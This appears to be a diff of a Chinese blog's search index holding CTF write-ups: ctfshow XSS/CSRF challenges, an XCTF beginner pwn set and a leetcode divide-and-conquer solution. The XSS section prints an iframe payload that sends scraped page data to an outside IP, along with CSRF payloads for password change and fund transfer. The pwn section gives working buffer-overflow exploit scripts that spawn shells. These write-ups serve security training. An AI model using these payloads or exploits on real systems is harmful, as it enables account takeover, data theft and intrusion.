+<p>事实上我们在打的时候也不知道是具体flag值对应的下标，测试发现是1（其实应该也可以爆破</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=<span class="string">&quot;window.open(&#x27;http://121.5.227.123:2333/?cookie=&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="web330get-xss">web330（GET XSS）</h3>
+<p>这算是非常经典的题型了，但其实应该算是CSRF攻击，在各种比赛里都有这个的影子。</p>
+<p>简单来说，就是让管理员访问我们的恶意链接，由于没有csrf鉴权，因此可以直接利用连接修改密码。</p>
+<p>附上payload:</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=<span class="string">&quot;window.open(&#x27;http://127.0.0.1/api/change.php?p=123456&#x27;)&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<p>当然，由于之前的页面仍然存在，所以我们可以直接读取整个页面的内容，这样找到其中的flag，不过这应该算是非预期解。</p>
+<h3 id="web331post-xss">web331（POST XSS）</h3>
+<p>这道题的处理原理跟上一题是一样的理解，还是利用CSRF来实现admin用户的密码修改。</p>
+<p>这次的修改密码参数利用POST方法传参，这里我们可以利用XMLHttpRequest</p>
+<p>原型代码如下：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> httpRequest = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">    httpRequest.open(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;http://121.5.227.123/xss/cookie.php&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">    httpRequest.setRequestHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">    httpRequest.send(<span class="string">&#x27;p=1234567&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>转换成payload如下：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=<span class="string">&quot;var httpRequest = new XMLHttpRequest();httpRequest.open(&#x27;POST&#x27;, &#x27;http://127.0.0.1/api/change.php&#x27;, true);httpRequest.setRequestHeader(&#x27;Content-type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);httpRequest.send(&#x27;p=123456&#x27;);&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<p>当然也可以利用fetch来做：</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">let</span> res = fetch(<span class="string">&#x27;http://127.0.0.1/api/change.php&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="attr">body</span>: <span class="string">&#x27;p=12345678&#x27;</span>,</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;Content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="web332转账xss">web332（转账XSS）</h3>
+<p>这道题在之前的极客大挑战也有出现过，还是CSRF的鉴权漏洞</p>
+<p>POST型XSS获取内容</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;iframe onload=<span class="string">&quot;var httpRequest = new XMLHttpRequest();httpRequest.open(&#x27;POST&#x27;, &#x27;http://127.0.0.1/api/amount.php&#x27;, true);httpRequest.setRequestHeader(&#x27;Content-type&#x27;,&#x27;application/x-www-form-urlencoded&#x27;);httpRequest.send(&#x27;u=user1&amp;a=10000&#x27;);&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+<h3 id="web333">web333</h3>
+<p>同web331</p>
+<p>XSS篇章暂时结束</p>
 ]]></content>
       <categories>
         <category>ctf</category>
         <category>web</category>
         <category>wp</category>
-        <category>LFI</category>
+        <category>xss</category>
       </categories>
       <tags>
         <tag>ctf</tag>
         <tag>web</tag>
         <tag>wp</tag>
-        <tag>LFI</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>leetcode-分治-为运算表达式设计优先级</title>
-    <url>/2022/03/27/blog0006-leetcode-%E5%88%86%E6%B2%BB-%E4%B8%BA%E8%BF%90%E7%AE%97%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%BE%E8%AE%A1%E4%BC%98%E5%85%88%E7%BA%A7/</url>
-    <content><![CDATA[<h2 id="一题目描述">一、题目描述</h2>
-<p>给你一个由数字和运算符组成的字符串 <code>expression</code> ，按不同优先级组合数字和运算符，计算并返回所有可能组合的结果。你可以 <strong>按任意顺序</strong> 返回答案</p>
-<span id="more"></span>
-<p><strong>示例：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：expression = &quot;2-1-1&quot;</span><br><span class="line">输出：[0,2]</span><br><span class="line">解释：</span><br><span class="line">((2-1)-1) = 0 </span><br><span class="line">(2-(1-1)) = 2</span><br><span class="line"></span><br><span class="line">输入：expression = &quot;2*3-4*5&quot;</span><br><span class="line">输出：[-34,-14,-10,-10,10]</span><br><span class="line">解释：</span><br><span class="line">(2*(3-(4*5))) = -34 </span><br><span class="line">((2*3)-(4*5)) = -14 </span><br><span class="line">((2*(3-4))*5) = -10 </span><br><span class="line">(2*((3-4)*5)) = -10 </span><br><span class="line">(((2*3)-4)*5) = 10</span><br></pre></td></tr></table></figure>
-<p><strong>提示：</strong></p>
-<ul>
-<li>1 &lt;= expression.length &lt;= 20</li>
-<li>输入表达式中的所有整数值在范围 [0, 99]</li>
-<li>expression 由数字和算符 '+'、'-' 和 '*' 组成。</li>
-</ul>
-<h2 id="二我的思路">二、我的思路</h2>
-<p>最开始，我的处理思路是对于一个expression，我们可以分解一个数字和一个剩余的表达式。将（2*3-4*5）分解为 <span class="math display">\[
-2*(3-4*5)\\
-2*3-(4*5)
-\]</span> 但显然这样是不对的，我们需要注意的是，这样子我们就没有回头路了，简单的理解就是我们无法处理： <span class="math display">\[
-((2*3)-4)*5
-\]</span> 但是一旦意识到我们存在这样的错误时，我们发现其实将我们前面的思路改进一下，当我们计算出<span class="math display">\[2*3\]</span>时，我们就把式子转化为<span class="math inline">\((6-4)*5\)</span>，这又是我们之前处理的范围了。</p>
-<p>于是，我们将我们之前的思路扭转一下，对于任意的表达式<span class="math inline">\(c\)</span>，我们可以将其拆分为<span class="math inline">\(a\)</span> op <span class="math inline">\(b\)</span>，这样我们就得到了分治处理的思路。</p>
-<p><strong>终止条件为：当表达式不存在操作符时，即表达式为数值时，我们直接返回数值本身</strong></p>
-<p>我的代码如下：</p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">//计算表达式</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">cal</span><span class="params">(<span class="keyword">int</span> num1, <span class="keyword">int</span> num2 , <span class="keyword">char</span> op)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="built_in"><span class="keyword">switch</span></span>(op)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>: <span class="keyword">return</span> num1 + num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>: <span class="keyword">return</span> num1 - num2;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>: <span class="keyword">return</span> num1 * num2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">diffWaysToCompute</span><span class="params">(string expression)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = expression.<span class="built_in">length</span>();</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; v3;</span><br><span class="line">        <span class="keyword">int</span> op_flag = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">char</span> op = expression[i];</span><br><span class="line">            <span class="keyword">if</span>(!(op == <span class="string">&#x27;+&#x27;</span> || op == <span class="string">&#x27;-&#x27;</span> || op ==<span class="string">&#x27;*&#x27;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            op_flag = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//计算前半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; v1 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>(),expression.<span class="built_in">begin</span>() + i));</span><br><span class="line">            <span class="comment">//计算后半段的表达式结果</span></span><br><span class="line">            vector&lt;<span class="keyword">int</span>&gt; v2 = <span class="built_in">diffWaysToCompute</span>(<span class="built_in">string</span>(expression.<span class="built_in">begin</span>() + i + <span class="number">1</span>,expression.<span class="built_in">end</span>()));</span><br><span class="line">            </span><br><span class="line">            <span class="comment">//二重循环，类似笛卡尔积</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;v1.<span class="built_in">size</span>();i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;v2.<span class="built_in">size</span>();j++)</span><br><span class="line">                &#123;</span><br><span class="line">                    v3.<span class="built_in">push_back</span>(<span class="built_in">cal</span>(v1[i],v2[j],op));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 不存在运算符，即到达终止条件</span></span><br><span class="line">        <span class="keyword">if</span>(op_flag == <span class="number">0</span>)</span><br><span class="line">            v3.<span class="built_in">push_back</span>(<span class="built_in">stoi</span>(expression));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>leetcode</category>
-        <category>分治</category>
-      </categories>
-      <tags>
-        <tag>algorithm</tag>
-        <tag>leetcode</tag>
-        <tag>算法</tag>
-        <tag>题解</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwn-xctf-新手区wp</title>
-    <url>/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
-    <content><![CDATA[<h2 id="一level_2">一、Level_2</h2>
-<p>pwn到手第一步，先玩一玩看看.</p>
-<span id="more"></span>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_1.png" /></p>
-<p>简单的输入提示，基本上获得不了什么信息。</p>
-<p>pwn到手第二步，反手来一个checksec看看一些基本信息。</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
-<p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call system 和 read，这给了我们布栈的空间。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804844b &lt;+0&gt;:	push   ebp</span><br><span class="line">0x0804844c &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">0x0804844e &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">0x08048454 &lt;+9&gt;:	sub    esp,0xc</span><br><span class="line">0x08048457 &lt;+12&gt;:	push   0x8048540</span><br><span class="line">0x0804845c &lt;+17&gt;:	call   0x8048320 &lt;system@plt&gt;</span><br><span class="line">0x08048461 &lt;+22&gt;:	add    esp,0x10</span><br><span class="line">0x08048464 &lt;+25&gt;:	sub    esp,0x4</span><br><span class="line">0x08048467 &lt;+28&gt;:	push   0x100</span><br><span class="line">0x0804846c &lt;+33&gt;:	lea    eax,[ebp-0x88]	//read 写入的内存起点</span><br><span class="line">0x08048472 &lt;+39&gt;:	push   eax</span><br><span class="line">0x08048473 &lt;+40&gt;:	push   0x0</span><br><span class="line">0x08048475 &lt;+42&gt;:	call   0x8048310 &lt;read@plt&gt;</span><br><span class="line">0x0804847a &lt;+47&gt;:	add    esp,0x10</span><br><span class="line">0x0804847d &lt;+50&gt;:	nop</span><br><span class="line">0x0804847e &lt;+51&gt;:	leave  </span><br><span class="line">0x0804847f &lt;+52&gt;:	ret  </span><br></pre></td></tr></table></figure>
-<p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 "/bin/sh"的地址。</p>
-<p>当ret时，我们回到了call 0x8048320 <a href="mailto:system@plt" class="email">system@plt</a>，此时esp由于pop eip的效果，此时内部存放着"/bin/sh"的地址，这也顺利地完成了system函数的参数布置。</p>
-<p>Python的exp如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 111.200.241.244:65392</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;65392&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./xctf_2&quot;)</span></span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Input:\n&quot;</span></span><br><span class="line">ret_addr = <span class="number">0x804845c</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line">fill_num = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h2 id="二guess_num">二、guess_num</h2>
-<p>这道题有点意思，丢到ida里面就可以发现这是一个猜随机数的题。</p>
-<p>这里其实是之前web里面遇到的一个点，我们直接把seed[0]给覆盖了，那么随机数的产生就是确定的。</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_2.png" /></p>
-<p>exp.py如下：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;60037&quot;</span>)</span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Your name:&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x1</span>)</span><br><span class="line">num_list = [<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam, payload)</span><br><span class="line"></span><br><span class="line">dam_1 = <span class="string">&quot;Please input your guess number:&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.sendlineafter(dam_1,<span class="built_in">str</span>(num_list[i]).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="三int_overflow整数溢出">三、int_overflow（整数溢出）</h2>
-<p>整数溢出这个就没什么好说的，在高程作业中做太多了。</p>
-<p>重点是来看看我们要如何利用这个漏洞来实现攻击的，shift+F12，我们可以发现源程序中存在get_shell()的后门，并且没开PIE，这就给了我们re2text的利用空间。</p>
-<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_3.png" /></p>
-<p>很显然，我们可以尝试利用dest的空间来修改ret的地址，但是我们要如何进入这个分支呢？</p>
-<p>注意到，v3是unsigned __int8 类型，当int strlen(char *)赋值时，会发生高位截断，所以我们只需要写入一个长度超过256的字符串给s，就能实现栈空间数据的修改。</p>
-<p>补充：我们可以考虑在其他函数中read字符串的时候实现re2text，但是这道题在输入时限制的read的长度，所以我们只能考虑利用整数溢出来实现。</p>
-<p>exp.py</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./xctf_4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(pwnfile)</span></span><br><span class="line">io=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;54657&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_func_name = <span class="string">&quot;what_is_this&quot;</span></span><br><span class="line">leak_func_addr = elf.symbols[leak_func_name]</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x14</span> + <span class="number">0x04</span>) * <span class="string">b&#x27;a&#x27;</span> + p32(leak_func_addr) + (<span class="number">260</span>-<span class="number">0x14</span>-<span class="number">0x04</span>-<span class="number">0x04</span>) * <span class="string">b&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">choice = <span class="string">&quot;1&quot;</span></span><br><span class="line">dam_0 = <span class="string">&quot;Your choice:&quot;</span></span><br><span class="line">io.sendlineafter(dam_0, choice)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;hello&quot;</span></span><br><span class="line">dam_1 = <span class="string">&quot;Please input your username:\n&quot;</span> </span><br><span class="line">io.sendlineafter(dam_1,name)</span><br><span class="line"></span><br><span class="line">dam_2 = <span class="string">&quot;Please input your passwd:&quot;</span></span><br><span class="line">io.sendlineafter(dam_2,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>ctf</category>
-        <category>pwn</category>
-        <category>wp</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>wp</tag>
-        <tag>xctf</tag>
-        <tag>pwn</tag>
+        <tag>ctfshow</tag>
+        <tag>xss</tag>
       </tags>
   </entry>
   <entry>
@@ -492,6 +407,91 @@
         <tag>web</tag>
         <tag>wp</tag>
         <tag>hacker101</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwn-xctf-新手区wp</title>
+    <url>/2022/03/27/blog0008-pwn-xctf-%E6%96%B0%E6%89%8B%E5%8C%BAwp/</url>
+    <content><![CDATA[<h2 id="一level_2">一、Level_2</h2>
+<p>pwn到手第一步，先玩一玩看看.</p>
+<span id="more"></span>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_1.png" /></p>
+<p>简单的输入提示，基本上获得不了什么信息。</p>
+<p>pwn到手第二步，反手来一个checksec看看一些基本信息。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Arch:     i386-32-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
+<p>没有PIE，这很好，我们可以再进一步尝试看看，丢到IDA里面，发现函数内有 call system 和 read，这给了我们布栈的空间。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0804844b &lt;+0&gt;:	push   ebp</span><br><span class="line">0x0804844c &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">0x0804844e &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">0x08048454 &lt;+9&gt;:	sub    esp,0xc</span><br><span class="line">0x08048457 &lt;+12&gt;:	push   0x8048540</span><br><span class="line">0x0804845c &lt;+17&gt;:	call   0x8048320 &lt;system@plt&gt;</span><br><span class="line">0x08048461 &lt;+22&gt;:	add    esp,0x10</span><br><span class="line">0x08048464 &lt;+25&gt;:	sub    esp,0x4</span><br><span class="line">0x08048467 &lt;+28&gt;:	push   0x100</span><br><span class="line">0x0804846c &lt;+33&gt;:	lea    eax,[ebp-0x88]	//read 写入的内存起点</span><br><span class="line">0x08048472 &lt;+39&gt;:	push   eax</span><br><span class="line">0x08048473 &lt;+40&gt;:	push   0x0</span><br><span class="line">0x08048475 &lt;+42&gt;:	call   0x8048310 &lt;read@plt&gt;</span><br><span class="line">0x0804847a &lt;+47&gt;:	add    esp,0x10</span><br><span class="line">0x0804847d &lt;+50&gt;:	nop</span><br><span class="line">0x0804847e &lt;+51&gt;:	leave  </span><br><span class="line">0x0804847f &lt;+52&gt;:	ret  </span><br></pre></td></tr></table></figure>
+<p>从这里我们可以分析出来，我们读入0x88 + 0x04 字节，覆盖ebp -&gt; 写入 call system（0x0804845c）-&gt; 写入 "/bin/sh"的地址。</p>
+<p>当ret时，我们回到了call 0x8048320 <a href="mailto:system@plt" class="email">system@plt</a>，此时esp由于pop eip的效果，此时内部存放着"/bin/sh"的地址，这也顺利地完成了system函数的参数布置。</p>
+<p>Python的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 111.200.241.244:65392</span></span><br><span class="line">io = remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;65392&quot;</span>)</span><br><span class="line"><span class="comment"># io = process(&quot;./xctf_2&quot;)</span></span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Input:\n&quot;</span></span><br><span class="line">ret_addr = <span class="number">0x804845c</span></span><br><span class="line">bin_addr = <span class="number">0x804a024</span></span><br><span class="line">fill_num = <span class="number">0x88</span> + <span class="number">0x4</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*fill_num + p32(ret_addr) + p32(bin_addr)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="二guess_num">二、guess_num</h2>
+<p>这道题有点意思，丢到ida里面就可以发现这是一个猜随机数的题。</p>
+<p>这里其实是之前web里面遇到的一个点，我们直接把seed[0]给覆盖了，那么随机数的产生就是确定的。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_2.png" /></p>
+<p>exp.py如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">io=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;60037&quot;</span>)</span><br><span class="line"></span><br><span class="line">dam=<span class="string">&quot;Your name:&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x1</span>)</span><br><span class="line">num_list = [<span class="number">2</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="number">4</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(dam, payload)</span><br><span class="line"></span><br><span class="line">dam_1 = <span class="string">&quot;Please input your guess number:&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    io.sendlineafter(dam_1,<span class="built_in">str</span>(num_list[i]).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="三int_overflow整数溢出">三、int_overflow（整数溢出）</h2>
+<p>整数溢出这个就没什么好说的，在高程作业中做太多了。</p>
+<p>重点是来看看我们要如何利用这个漏洞来实现攻击的，shift+F12，我们可以发现源程序中存在get_shell()的后门，并且没开PIE，这就给了我们re2text的利用空间。</p>
+<p><img src="https://raw.githubusercontent.com/whistleH/blogImage/main/img/blog1_100/blog0008/blog0008_3.png" /></p>
+<p>很显然，我们可以尝试利用dest的空间来修改ret的地址，但是我们要如何进入这个分支呢？</p>
+<p>注意到，v3是unsigned __int8 类型，当int strlen(char *)赋值时，会发生高位截断，所以我们只需要写入一个长度超过256的字符串给s，就能实现栈空间数据的修改。</p>
+<p>补充：我们可以考虑在其他函数中read字符串的时候实现re2text，但是这道题在输入时限制的read的长度，所以我们只能考虑利用整数溢出来实现。</p>
+<p>exp.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwnfile = <span class="string">&quot;./xctf_4&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(pwnfile)</span></span><br><span class="line">io=remote(<span class="string">&quot;111.200.241.244&quot;</span>,<span class="string">&quot;54657&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_func_name = <span class="string">&quot;what_is_this&quot;</span></span><br><span class="line">leak_func_addr = elf.symbols[leak_func_name]</span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x14</span> + <span class="number">0x04</span>) * <span class="string">b&#x27;a&#x27;</span> + p32(leak_func_addr) + (<span class="number">260</span>-<span class="number">0x14</span>-<span class="number">0x04</span>-<span class="number">0x04</span>) * <span class="string">b&#x27;a&#x27;</span></span><br><span class="line"></span><br><span class="line">choice = <span class="string">&quot;1&quot;</span></span><br><span class="line">dam_0 = <span class="string">&quot;Your choice:&quot;</span></span><br><span class="line">io.sendlineafter(dam_0, choice)</span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;hello&quot;</span></span><br><span class="line">dam_1 = <span class="string">&quot;Please input your username:\n&quot;</span> </span><br><span class="line">io.sendlineafter(dam_1,name)</span><br><span class="line"></span><br><span class="line">dam_2 = <span class="string">&quot;Please input your passwd:&quot;</span></span><br><span class="line">io.sendlineafter(dam_2,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>pwn</category>
+        <category>wp</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>wp</tag>
+        <tag>xctf</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>leetcode-分治-为运算表达式设计优先级</title>
+    <url>/2022/03/27/blog0006-leetcode-%E5%88%86%E6%B2%BB-%E4%B8%BA%E8%BF%90%E7%AE%97%E8%A1%A8%E8%BE%BE%E5%BC%8F%E8%AE%BE%E8%AE%A1%E4%BC%98%E5%85%88%E7%BA%A7/</url>
+    <content><![CDATA[<h2 id="一题目描述">一、题目描述</h2>
+<p>给你一个由数字和运算符组成的字符串 <code>expression</code> ，按不同优先级组合数字和运算符，计算并返回所有可能组合的结果。你可以 <strong>按任意顺序</strong> 返回答案</p>
+<span id="more"></span>
+<p><strong>示例：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：expression = &quot;2-1-1&quot;</span><br><span class="line">输出：[0,2]</span><br><span class="line">解释：</span><br><span class="line">((2-1)-1) = 0 </span><br><span class="line">(2-(1-1)) = 2</span><br><span class="line"></span><br><span class="line">输入：expression = &quot;2*3-4*5&quot;</span><br><span class="line">输出：[-34,-14,-10,-10,10]</span><br><span class="line">解释：</span><br><span class="line">(2*(3-(4*5))) = -34 </span><br><span class="line">((2*3)-(4*5)) = -14 </span><br><span class="line">((2*(3-4))*5) = -10 </span><br><span class="line">(2*((3-4)*5)) = -10 </span><br><span class="line">(((2*3)-4)*5) = 10</span><br></pre></td></tr></table></figure>
+<p><strong>提示：</strong></p>
+<ul>
+<li>1 &lt;= expression.length &lt;= 20</li>
+<li>输入表达式中的所有整数值在范围 [0, 99]</li>
